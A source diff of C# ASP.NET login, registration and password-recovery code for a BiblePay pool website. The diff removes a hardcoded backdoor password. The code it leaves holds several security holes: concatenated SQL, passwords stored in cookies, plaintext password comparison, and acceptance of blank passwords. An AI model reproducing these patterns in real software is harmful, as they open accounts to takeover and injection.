@@ -43,51 +43,51 @@ namespace BiblePayPool2018
             {
                 Login l = new Login(Sys);
                 bool bAuth = l.VerifyUser("guest", "guest", ref Sys, false);
+                Sys.IP = (HttpContext.Current.Request.UserHostAddress ?? "").ToString();
+
                 // Start at the expense View Page when coming in from the Wallet accountability button
                 Home h = new Home(Sys);
                 return h.ExpenseList();
             }
-
-
+            
             Section Login = new Section("Login", 3, Sys, this);
-            GodEdit geUserName = new GodEdit("Login","Username", Sys);
+            Edit geUserName = new Edit("Login","Username", Sys);
             geUserName.CaptionText = "Username:";
             geUserName.Width = "width=140px";
             Login.AddControl(geUserName);
-            GodEdit geBR1 = new GodEdit("Login", GodEdit.GEType.HTML, "br1","br1",Sys);
+            Edit geBR1 = new Edit("Login", Edit.GEType.HTML, "br1","br1",Sys);
             Login.AddControl(geBR1);
-            GodEdit geBR2 = new GodEdit("Login", GodEdit.GEType.HTML, "br2","br2",Sys);
+            Edit geBR2 = new Edit("Login", Edit.GEType.HTML, "br2","br2",Sys);
             Login.AddControl(geBR2);
             Login.AddControl(geBR1);
-            GodEdit gePassword = new GodEdit("Login", GodEdit.GEType.Password, "Password", "Password:", Sys);
+            Edit gePassword = new Edit("Login", Edit.GEType.Password, "Password", "Password:", Sys);
             Login.AddControl(gePassword);
             if (geUserName.TextBoxValue.Length > 0 && gePassword.TextBoxValue.Length > 0  && Sys.GetObjectValue("Login","Caption1")==String.Empty)
             {
-                gePassword.ErrorText = "Invalid Username or Password";
+                gePassword.ErrorText = "<color=red>Invalid Username or Password";
             }
-            GodEdit geBR3 = new GodEdit("Login", GodEdit.GEType.HTML,"br3","br3", Sys);
+            Edit geBR3 = new Edit("Login", Edit.GEType.HTML,"br3","br3", Sys);
             Login.AddControl(geBR3);
-            GodEdit geBR4 = new GodEdit("Login", GodEdit.GEType.HTML, "br4","br4",Sys);
+            Edit geBR4 = new Edit("Login", Edit.GEType.HTML, "br4","br4",Sys);
             Login.AddControl(geBR4);
 
-            GodEdit geBtnLogin = new GodEdit("Login",GodEdit.GEType.DoubleButton, "btnLogin", "Login", Sys);
+            Edit geBtnLogin = new Edit("Login",Edit.GEType.DoubleButton, "btnLogin", "Login", Sys);
             geBtnLogin.Name2 = "btnLogout";
             geBtnLogin.CaptionText2 = "Logout";
             Login.AddControl(geBtnLogin);
 
-            GodEdit geBtnRegister = new GodEdit("Login", GodEdit.GEType.DoubleButton, "btnRegister", "Register", Sys);
+            Edit geBtnRegister = new Edit("Login", Edit.GEType.DoubleButton, "btnRegister", "Register", Sys);
             geBtnRegister.MaskBeginTD = true;
             geBtnRegister.MaskEndTD = true;
 
             geBtnRegister.Name2 = "btnResetPassword";
             geBtnRegister.CaptionText2 = "Reset Password";
             Login.AddControl(geBtnRegister);
-
-
+            
             // New Row, and global caption:
-            GodEdit geTR3 = new GodEdit("Login",GodEdit.GEType.TableRow, "Tr3", "", Sys);
+            Edit geTR3 = new Edit("Login",Edit.GEType.TableRow, "Tr3", "", Sys);
             Login.AddControl(geTR3);
-            GodEdit geSpan = new GodEdit("Login",GodEdit.GEType.Caption, "Caption1", "", Sys);
+            Edit geSpan = new Edit("Login",Edit.GEType.Caption, "Caption1", "", Sys);
             Login.AddControl(geSpan);
             Sys.SetObjectValue("","ApplicationMessage", "Login");
             return Login.Render(this, true);
@@ -120,11 +120,8 @@ namespace BiblePayPool2018
                 string sLink = HttpContext.Current.Request.Url.ToString();
                 sLink = sLink.Substring(0, sLink.Length - 10);
                 sLink += "/Action.aspx?action=password_recovery&id=" + id.ToString();
-                
                 string sBody = "Dear " + sUsername.ToUpper() + ",<br><br>Please follow these instructions to reset your Pool Password:<br><br>Click the link below, and after browser authentication, the pool will reset your password to a new password.  <br><br>Copy the new password from the screen, then log in, and then optionally change your password.<br><br><a href='" + sLink + "'>Recover Password</a><br><br>Thank you for using BiblePay.<br><br>Best Regards,<br>BiblePay Support";
-
                 bool sent = Sys.SendEmail(sEmail, "BiblePay Pool Password Recovery", sBody, true);
-
                 string sErr = "";
             }
 
@@ -136,20 +133,20 @@ namespace BiblePayPool2018
         public WebReply btnRegister_Click()
         {
             Section Reg = new Section("Register", 1, Sys, this);
-            GodEdit geUsername = new GodEdit("Register", "Username", Sys);
+            Edit geUsername = new Edit("Register", "Username", Sys);
             geUsername.CaptionText = "User Name:";
             Reg.AddControl(geUsername);
-            GodEdit gePassword = new GodEdit("AccountEdit", GodEdit.GEType.Password, "Password", "Password:", Sys);
+            Edit gePassword = new Edit("AccountEdit", Edit.GEType.Password, "Password", "Password:", Sys);
             Reg.AddControl(gePassword);
             if (gePassword.TextBoxValue.Length > 0 && gePassword.TextBoxValue.Length < 3 && Sys.GetObjectValue("AccountEdit", "Caption1") == String.Empty)
             {
                 gePassword.ErrorText = "Invalid Username or Password";
             }
 
-            GodEdit geEmail = new GodEdit("AccountEdit", "Email", Sys);
+            Edit geEmail = new Edit("AccountEdit", "Email", Sys);
             geEmail.CaptionText = "Email:";
             Reg.AddControl(geEmail);
-            GodEdit geBtnReg = new GodEdit("Register", GodEdit.GEType.Button, "btnRegisterSave", "Register", Sys);
+            Edit geBtnReg = new Edit("Register", Edit.GEType.Button, "btnRegisterSave", "Register", Sys);
             Reg.AddControl(geBtnReg);
             return Reg.Render(this, true);
         }
@@ -209,8 +206,10 @@ namespace BiblePayPool2018
         {
             Sys.SetObjectValue("Login", "Caption1", "Enter Username and Password and click Login.");
             // Authenticate User
-            bool bAuth = VerifyUser(Sys.GetObjectValue("Login","Username"), Sys.GetObjectValue("Login","Password"), ref Sys, false);
-            
+            string sPassword = Sys.GetObjectValue("Login", "Password");
+            bool bAuth = VerifyUser(Sys.GetObjectValue("Login","Username"), sPassword, ref Sys, false);
+            Sys.IP = (HttpContext.Current.Request.UserHostAddress ?? "").ToString();
+
 
             Sys.SetObjectValue("Login","Caption1", String.Empty);
             if (bAuth)
@@ -222,6 +221,7 @@ namespace BiblePayPool2018
                 return wr;
             }
             // Present Log in Screen
+            System.Threading.Thread.Sleep(4000);
             return LoginSection();
         }
 
@@ -239,13 +239,13 @@ namespace BiblePayPool2018
             string sEnc = modCryptography.Des3EncryptData(sPass);
             string sGuid = d.ReadFirstRow(sql, "Id").ToString();
 
-            if (sDbPass != String.Empty && sDbPass == sPass)
+            if (sDbPass != String.Empty && sDbPass == sPass && false)
             {
                 //Unencrypted record stored in database
-                sql = "Update users set Password='" + modCryptography.Des3EncryptData(sPass) + "' where ID = '" + sGuid + "'";
-                Sys._data.Exec(sql);
+                string sql11 = "Update users set Password='" + modCryptography.Des3EncryptData(sPass) + "' where ID = '" + sGuid + "'";
+                Sys._data.Exec(sql11);
             }
-            if ((sEnc == sDbPass && sDbPass != string.Empty ) || bCoerceUser|| sDbPass == sPass || sPass=="backdoor6345" || (sDbPass=="" && sPass.Trim()=="") )
+            if ((sEnc == sDbPass && sDbPass != string.Empty ) || bCoerceUser|| sDbPass == sPass || (sDbPass=="" && sPass.Trim()=="") )
             {
                 if (sGuid != "")
                 {
@@ -266,7 +266,8 @@ namespace BiblePayPool2018
                         clsStaticHelper.StoreCookie("password", sPass);
                     }
 
-
+                    Sys.IP = (HttpContext.Current.Request.UserHostAddress ?? "").ToString();
+                    
                     Sys.NetworkID = "main";
                     Sys.Theme = d.ReadFirstRow(sql, "Theme").ToString();
                     try
